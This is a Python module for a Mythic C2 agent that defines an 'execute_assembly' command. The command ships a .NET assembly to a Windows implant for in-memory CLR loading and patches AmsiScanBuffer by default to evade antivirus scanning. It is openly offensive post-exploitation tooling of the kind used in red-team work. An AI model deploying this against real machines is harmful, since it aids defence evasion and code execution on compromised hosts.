import base64

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_file",
                type=ParameterType.File,
                description="Assembly .NET a executer (EXE managee x64 ou AnyCPU)",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=0, required=True)],
            ),
            CommandParameter(
                name="args",
                type=ParameterType.String,
                description="Arguments passes a Main() (espace-separes)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=1, required=False)],
            ),
            CommandParameter(
                name="amsi_bypass",
                type=ParameterType.Boolean,
                description="Patcher AmsiScanBuffer avant de charger l'assembly",
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=2, required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly -assembly_file <file> [-args <string>] [-amsi_bypass true]"
    description = (
        "Charge et execute un assembly .NET en memoire via CLR hosting (ICLRMetaHost). "
        "La sortie console est capturee et retournee. "
        "AMSI est optionnellement patche avant le chargement. "
        "Le CLR est charge dans le processus courant (in-process execution)."
    )
    version = 1
    author = "@0xbbuddha"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1059.001", "T1620"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        try:
            file_id = taskData.args.get_arg("assembly_file")
            args_str = taskData.args.get_arg("args") or ""
            amsi     = taskData.args.get_arg("amsi_bypass")
            if amsi is None:
                amsi = True

            file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=file_id))
            if not file_resp.Success:
                response.Success = False
                response.Error = f"Failed to retrieve assembly: {file_resp.Error}"
                return response

            asm_b64 = base64.b64encode(file_resp.Content).decode()
            taskData.args.add_arg("asm_b64", asm_b64, parameter_type=ParameterType.String)

            preview = args_str[:40] + "..." if len(args_str) > 40 else args_str
            amsi_tag = " +amsi" if amsi else ""
            response.DisplayParams = f"{len(file_resp.Content):,}B{amsi_tag}" + (f" args={preview}" if preview else "")
        except Exception as e:
            response.Success = False
            response.Error = str(e)
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
